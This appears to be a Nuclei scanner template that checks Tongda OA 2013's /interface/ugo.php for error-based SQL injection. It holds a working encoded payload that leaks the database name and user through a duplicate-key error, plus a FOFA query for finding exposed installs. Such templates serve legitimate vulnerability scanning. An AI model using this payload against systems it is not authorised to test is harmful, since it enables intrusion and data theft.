id: tongda-oa-ugo-sqli

info:
  name: 通达 OA 2013 /interface/ugo.php - sqli
  author: linuxlz
  severity: high
  description: 通达OA 2013 /interface/ugo.php 报错注入
  reference:
    - https://mp.weixin.qq.com/s/6ajtYnyBSzcZrATQp_0i5A
  metadata:
    max-request: 1
    verified: true
    fofa-query: "Office Anywhere 2013"
  tags: tongda,oa,sqli


http:
  - raw:
      - |
        GET /interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20database()),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "错误#1062:"
          - "SQL语句:"
          - "root@"
        condition: and 